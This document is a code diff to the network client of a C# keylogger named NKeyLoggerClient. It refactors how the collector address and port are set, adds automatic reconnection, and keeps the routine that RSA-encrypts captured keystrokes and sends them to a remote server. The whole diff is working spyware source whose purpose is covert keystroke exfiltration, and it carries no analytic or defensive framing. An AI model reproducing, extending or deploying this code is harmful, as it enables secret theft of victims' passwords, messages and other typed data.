@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
+using System.Reflection.Metadata;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
@@ -12,18 +13,16 @@ namespace NKeyLoggerClient;
 internal class NetworkClient : ISender, IDisposable
 {
     private Network client { get; set; } = new Network();
-    private string url = "localhost";
-    private int port = 56535;
-    private readonly RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
-    private readonly System.Timers.Timer reconnectTimer = new System.Timers.Timer(5000);
-    public NetworkClient()
+    public AbstractSetting settings { get; }
+    private readonly RSACryptoServiceProvider rsa;
+    private readonly System.Timers.Timer reconnectTimer;
+    public NetworkClient(AbstractSetting settings)
     {
-        connect();
-        initTimer();
-    }
-
-    public NetworkClient(string settingPath) {
-        loadSettings(settingPath);
+        this.settings = settings;
+        this.settings.onChangeFile += updateSetting;
+        fixSettings(this.settings);
+        rsa = new RSACryptoServiceProvider();
+        reconnectTimer = new System.Timers.Timer( int.Parse(settings.Properties["reconnect"]) );
         connect();
         initTimer();
     }
@@ -32,33 +31,35 @@ internal class NetworkClient : ISender, IDisposable
         this.Dispose();
     }
 
+    private void fixSettings(AbstractSetting settings)
+    {
+        try
+        {
+            int reconnectTime = int.Parse(settings.Properties["reconnect"]);
+            int port = int.Parse(settings.Properties["port"]);
+            if (port >= 0xFFFF || port <= 0)
+                throw new ApplicationException("Error parse settings: invalid port");
+            string address = settings.Properties["address"];
+        } catch(Exception) {
+            if (settings is Setting s)
+            {
+                s.insert("address", "localhost");
+                s.insert("port", "56535");
+                s.insert("reconnect", "5000");
+            }
+        }
+    }
+
+    private void updateSetting(AbstractSetting settings)
+    {
+        fixSettings(settings);
+        connect();
+    }
     private void initTimer()
     {
         reconnectTimer.Elapsed += reconnect;
         reconnectTimer.Start();
     }
-    public void loadSettings(string settingPath)
-    {
-        try
-        {
-            string[] lines = File.ReadAllLines(settingPath);
-            foreach (string line in lines)
-            {
-                var elems = line.Split(' ');
-                if (elems.First().ToLower() == "url" || elems.First().ToLower() == "ip")
-                    url = elems[1].Trim();
-                if (elems.First().ToLower() == "port")
-                    port = int.Parse(elems[1].Trim());
-            }
-        }
-        catch (Exception ex)
-        {
-            if (client.socket.Connected)
-                client?.send(Encoding.UTF8.GetBytes(ex.Message), Network.Type.INFO);
-        }
-        connect();
-    }
-
     private void reconnect(object? sender, System.Timers.ElapsedEventArgs e)
     {
         if(!client.socket.Connected)
@@ -66,22 +67,32 @@ internal class NetworkClient : ISender, IDisposable
     }
     public void connect()
     {
+        var reconn = () =>
+        {
+            disconnect();
+            client = new Network();
+        };
+
         if (!client.socket.Connected)
             client = new Network();
         else {
-            disconnect();
-            client = new Network();
+            reconn();
         }
 
         do
         {
             try
             {
-                client.socket.Connect(url, port);
-                List<byte> dataOpenKey = client.recv().Result.data;
-                rsa.ImportRSAPublicKey(dataOpenKey?.ToArray(), out _ );
+                client.socket.Connect( settings.Properties["address"], int.Parse(settings.Properties["port"]) );
+                List<byte> dataOpenKey = client.recvAsync().Result.data;
+                rsa.ImportRSAPublicKey(dataOpenKey?.ToArray(), out _);
             }
-            catch (SocketException){ }
+            catch (SocketException){
+                reconn();
+            } catch(Exception)
+            {
+                reconn();
+            }
         } while (!client.socket.Connected);
     }
 
@@ -100,16 +111,17 @@ internal class NetworkClient : ISender, IDisposable
                 return;
 
             byte[] encData = rsa.Encrypt(keyInfo.GetBytes(), false);
-            client.send(encData, Network.Type.KEY).Wait();
+            client.sendAsync(encData, Network.Type.KEY).Wait();
         }
         catch (Exception ex)
         {
             if(client.socket.Connected)
-                client?.send(Encoding.UTF8.GetBytes(ex.Message), Network.Type.INFO);
+                client?.sendAsync(Encoding.UTF8.GetBytes(ex.Message), Network.Type.INFO);
         }
     }
     public void Dispose()
     {
         client.Dispose();
+        reconnectTimer.Dispose();
     }
 }
